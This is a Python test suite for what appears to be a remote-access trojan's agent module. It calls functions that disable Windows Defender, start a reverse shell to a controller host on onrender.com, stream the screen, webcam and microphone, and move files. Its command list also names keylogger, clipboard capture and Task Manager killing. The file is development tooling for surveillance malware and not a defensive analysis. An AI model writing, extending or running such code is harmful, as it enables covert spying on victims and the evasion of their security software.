#!/usr/bin/env python3
"""
Comprehensive test script for streaming, PowerShell, reverse shell, and file transfer fixes
"""

import sys
import os
import time
import traceback

def test_powershell_functions():
    """Test PowerShell-related functions."""
    print("\n" + "="*50)
    print("Testing PowerShell Functions")
    print("="*50)
    
    try:
        import main
        
        # Test PowerShell command execution
        print("Testing PowerShell command execution...")
        result = main.execute_command("echo 'PowerShell test'")
        print(f"Command result: {result[:100]}...")
        
        # Test PowerShell availability check
        print(f"Windows available: {main.WINDOWS_AVAILABLE}")
        
        # Test PowerShell-specific functions
        if main.WINDOWS_AVAILABLE:
            print("Testing Windows-specific PowerShell functions...")
            # These should handle errors gracefully
            result = main.disable_defender_powershell()
            print(f"Defender PowerShell disable result: {result}")
        else:
            print("Testing Linux PowerShell fallback...")
            result = main.execute_command("echo 'Linux command test'")
            print(f"Linux command result: {result[:100]}...")
        
        print("✅ PowerShell functions working")
        return True
        
    except Exception as e:
        print(f"❌ PowerShell test failed: {e}")
        traceback.print_exc()
        return False

def test_reverse_shell():
    """Test reverse shell functionality."""
    print("\n" + "="*50)
    print("Testing Reverse Shell")
    print("="*50)
    
    try:
        import main
        
        # Test reverse shell URL parsing
        print("Testing reverse shell URL parsing...")
        
        # Test different URL formats
        test_urls = [
            "https://agent-controller.onrender.com",
            "http://localhost:8080",
            "localhost:8080",
            "agent-controller.onrender.com"
        ]
        
        for url in test_urls:
            try:
                if url.startswith("https://"):
                    host = url.split("://")[1].split(":")[0].split("/")[0]
                elif url.startswith("http://"):
                    host = url.split("://")[1].split(":")[0].split("/")[0]
                else:
                    host = url.split(":")[0].split("/")[0]
                print(f"  {url} -> {host}")
            except Exception as e:
                print(f"  {url} -> Error: {e}")
        
        # Test reverse shell functions (without actually connecting)
        print("Testing reverse shell functions...")
        print(f"Reverse shell enabled: {main.REVERSE_SHELL_ENABLED}")
        
        # Test start function only (avoid thread joining issues)
        try:
            # Start reverse shell
            main.start_reverse_shell("test-agent")
            print("✅ Reverse shell start function working")
            
            # Test that the thread was created
            if main.REVERSE_SHELL_THREAD is not None:
                print("✅ Reverse shell thread created successfully")
            else:
                print("⚠️ Reverse shell thread not created")
            
            # Set enabled to False to stop the thread naturally
            main.REVERSE_SHELL_ENABLED = False
            
            # Clean up without joining
            if main.REVERSE_SHELL_SOCKET:
                try:
                    main.REVERSE_SHELL_SOCKET.close()
                except:
                    pass
                main.REVERSE_SHELL_SOCKET = None
            
            main.REVERSE_SHELL_THREAD = None
            print("✅ Reverse shell cleanup completed")
            
        except Exception as e:
            print(f"❌ Reverse shell test failed: {e}")
            return False
        
        print("✅ Reverse shell functions working")
        return True
        
    except Exception as e:
        print(f"❌ Reverse shell test failed: {e}")
        traceback.print_exc()
        return False

def test_screen_streaming():
    """Test screen streaming functionality."""
    print("\n" + "="*50)
    print("Testing Screen Streaming")
    print("="*50)
    
    try:
        import main
        
        # Test dependency availability
        print("Testing screen streaming dependencies...")
        print(f"MSS available: {main.MSS_AVAILABLE}")
        print(f"NUMPY available: {main.NUMPY_AVAILABLE}")
        print(f"CV2 available: {main.CV2_AVAILABLE}")
        
        if not all([main.MSS_AVAILABLE, main.NUMPY_AVAILABLE, main.CV2_AVAILABLE]):
            print("⚠️ Some dependencies missing, testing error handling...")
            main.stream_screen("test-agent")
            print("✅ Screen streaming error handling working")
            return True
        
        # Test screen streaming functions
        print("Testing screen streaming functions...")
        
        # Test start/stop functions
        try:
            main.start_streaming("test-agent")
            print("✅ Screen streaming start function working")
            time.sleep(0.1)  # Brief pause
            main.stop_streaming()
            print("✅ Screen streaming stop function working")
        except Exception as e:
            print(f"❌ Screen streaming start/stop failed: {e}")
            return False
        
        print("✅ Screen streaming functions working")
        return True
        
    except Exception as e:
        print(f"❌ Screen streaming test failed: {e}")
        traceback.print_exc()
        return False

def test_camera_streaming():
    """Test camera streaming functionality."""
    print("\n" + "="*50)
    print("Testing Camera Streaming")
    print("="*50)
    
    try:
        import main
        
        # Test dependency availability
        print("Testing camera streaming dependencies...")
        print(f"CV2 available: {main.CV2_AVAILABLE}")
        
        if not main.CV2_AVAILABLE:
            print("⚠️ OpenCV not available, testing error handling...")
            main.stream_camera("test-agent")
            print("✅ Camera streaming error handling working")
            return True
        
        # Test camera streaming functions
        print("Testing camera streaming functions...")
        
        # Test start/stop functions
        try:
            main.start_camera_streaming("test-agent")
            print("✅ Camera streaming start function working")
            time.sleep(0.1)  # Brief pause
            main.stop_camera_streaming()
            print("✅ Camera streaming stop function working")
        except Exception as e:
            print(f"❌ Camera streaming start/stop failed: {e}")
            return False
        
        print("✅ Camera streaming functions working")
        return True
        
    except Exception as e:
        print(f"❌ Camera streaming test failed: {e}")
        traceback.print_exc()
        return False

def test_audio_streaming():
    """Test audio streaming functionality."""
    print("\n" + "="*50)
    print("Testing Audio Streaming")
    print("="*50)
    
    try:
        import main
        
        # Test dependency availability
        print("Testing audio streaming dependencies...")
        print(f"PYAUDIO available: {main.PYAUDIO_AVAILABLE}")
        
        if not main.PYAUDIO_AVAILABLE:
            print("⚠️ PyAudio not available, testing error handling...")
            main.stream_audio("test-agent")
            print("✅ Audio streaming error handling working")
            return True
        
        # Test audio streaming functions
        print("Testing audio streaming functions...")
        
        # Test start/stop functions
        try:
            main.start_audio_streaming("test-agent")
            print("✅ Audio streaming start function working")
            time.sleep(0.1)  # Brief pause
            main.stop_audio_streaming()
            print("✅ Audio streaming stop function working")
        except Exception as e:
            print(f"❌ Audio streaming start/stop failed: {e}")
            return False
        
        print("✅ Audio streaming functions working")
        return True
        
    except Exception as e:
        print(f"❌ Audio streaming test failed: {e}")
        traceback.print_exc()
        return False

def test_file_transfer():
    """Test file upload/download functionality."""
    print("\n" + "="*50)
    print("Testing File Transfer")
    print("="*50)
    
    try:
        import main
        import base64
        
        # Test file upload function
        print("Testing file upload function...")
        
        # Create a test file
        test_content = "This is a test file for upload/download testing."
        test_content_b64 = base64.b64encode(test_content.encode()).decode()
        
        # Test upload with valid path
        result = main.handle_file_upload(['upload-file', './test_upload.txt', test_content_b64])
        print(f"Upload result: {result}")
        
        # Test upload with invalid path (should fail)
        result = main.handle_file_upload(['upload-file', '/etc/passwd', test_content_b64])
        print(f"Invalid path upload result: {result}")
        
        # Test upload with invalid base64 (should fail)
        result = main.handle_file_upload(['upload-file', './test_invalid.txt', 'invalid_base64'])
        print(f"Invalid base64 upload result: {result}")
        
        # Test file download function
        print("Testing file download function...")
        
        # Create a test file to download
        with open('./test_download.txt', 'w') as f:
            f.write("This is a test file for download testing.")
        
        # Test download with valid file
        result = main.handle_file_download(['download-file', './test_download.txt'], "test-agent")
        print(f"Download result: {result}")
        
        # Test download with non-existent file
        result = main.handle_file_download(['download-file', './non_existent.txt'], "test-agent")
        print(f"Non-existent file download result: {result}")
        
        # Test download with invalid path (should fail)
        result = main.handle_file_download(['download-file', '/etc/passwd'], "test-agent")
        print(f"Invalid path download result: {result}")
        
        # Cleanup test files
        try:
            os.remove('./test_upload.txt')
            os.remove('./test_download.txt')
        except:
            pass
        
        print("✅ File transfer functions working")
        return True
        
    except Exception as e:
        print(f"❌ File transfer test failed: {e}")
        traceback.print_exc()
        return False

def test_command_execution():
    """Test command execution functionality."""
    print("\n" + "="*50)
    print("Testing Command Execution")
    print("="*50)
    
    try:
        import main
        
        # Test basic command execution
        print("Testing basic command execution...")
        result = main.execute_command("echo 'test command'")
        print(f"Basic command result: {result[:100]}...")
        
        # Test command with timeout
        print("Testing command timeout handling...")
        result = main.execute_command("sleep 35")  # Should timeout
        print(f"Timeout command result: {result[:100]}...")
        
        # Test invalid command
        print("Testing invalid command handling...")
        result = main.execute_command("invalid_command_that_should_fail")
        print(f"Invalid command result: {result[:100]}...")
        
        # Test PowerShell vs Linux command execution
        if main.WINDOWS_AVAILABLE:
            print("Testing PowerShell command execution...")
            result = main.execute_command("Get-Process | Select-Object -First 1")
            print(f"PowerShell command result: {result[:100]}...")
        else:
            print("Testing Linux command execution...")
            result = main.execute_command("ps aux | head -1")
            print(f"Linux command result: {result[:100]}...")
        
        print("✅ Command execution functions working")
        return True
        
    except Exception as e:
        print(f"❌ Command execution test failed: {e}")
        traceback.print_exc()
        return False

def test_main_loop_logic():
    """Test main loop command handling logic."""
    print("\n" + "="*50)
    print("Testing Main Loop Logic")
    print("="*50)
    
    try:
        import main
        
        # Test command parsing logic
        print("Testing command parsing logic...")
        
        test_commands = [
            "start-stream",
            "stop-stream", 
            "start-camera",
            "stop-camera",
            "start-audio",
            "stop-audio",
            "upload-file:test.txt:base64content",
            "download-file:test.txt",
            "play-voice:test.wav",
            "live-audio:test",
            "terminate-process:notepad.exe",
            "echo 'test command'",
            "sleep"
        ]
        
        for cmd in test_commands:
            print(f"  Testing command: {cmd}")
            
            # Test command classification
            if cmd in ["start-stream", "stop-stream", "start-camera", "stop-camera", 
                      "start-audio", "stop-audio", "start-keylogger", "stop-keylogger",
                      "start-clipboard", "stop-clipboard", "start-reverse-shell", 
                      "stop-reverse-shell", "start-voice-control", "stop-voice-control", "kill-taskmgr"]:
                print(f"    -> Internal command")
            elif cmd.startswith("upload-file:"):
                print(f"    -> File upload command")
            elif cmd.startswith("download-file:"):
                print(f"    -> File download command")
            elif cmd.startswith("play-voice:"):
                print(f"    -> Voice playback command")
            elif cmd.startswith("live-audio:"):
                print(f"    -> Live audio command")
            elif cmd.startswith("terminate-process:"):
                print(f"    -> Process termination command")
            elif cmd == "sleep":
                print(f"    -> Sleep command")
            else:
                print(f"    -> System command")
        
        print("✅ Main loop logic working")
        return True
        
    except Exception as e:
        print(f"❌ Main loop logic test failed: {e}")
        traceback.print_exc()
        return False

def main():
    """Run all tests."""
    print("=" * 80)
    print("Comprehensive Streaming, PowerShell, Reverse Shell, and File Transfer Test Suite")
    print("=" * 80)
    
    tests = [
        ("PowerShell Functions", test_powershell_functions),
        ("Reverse Shell", test_reverse_shell),
        ("Screen Streaming", test_screen_streaming),
        ("Camera Streaming", test_camera_streaming),
        ("Audio Streaming", test_audio_streaming),
        ("File Transfer", test_file_transfer),
        ("Command Execution", test_command_execution),
        ("Main Loop Logic", test_main_loop_logic),
    ]
    
    passed = 0
    total = len(tests)
    
    for test_name, test_func in tests:
        print(f"\n{'='*20} {test_name} {'='*20}")
        try:
            if test_func():
                passed += 1
            else:
                print(f"❌ {test_name} failed")
        except Exception as e:
            print(f"❌ {test_name} failed with exception: {e}")
            traceback.print_exc()
    
    print("\n" + "=" * 80)
    print(f"Test Results: {passed}/{total} tests passed")
    print("=" * 80)
    
    if passed == total:
        print("🎉 All tests passed! All streaming, PowerShell, reverse shell, and file transfer fixes are working.")
        print("✅ PowerShell command execution is working")
        print("✅ Reverse shell URL parsing is working")
        print("✅ Screen streaming is working")
        print("✅ Camera streaming is working")
        print("✅ Audio streaming is working")
        print("✅ File upload/download is working")
        print("✅ Command execution is working")
        print("✅ Main loop logic is working")
        return True
    else:
        print("⚠️ Some tests failed. Please review the errors above.")
        return False

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)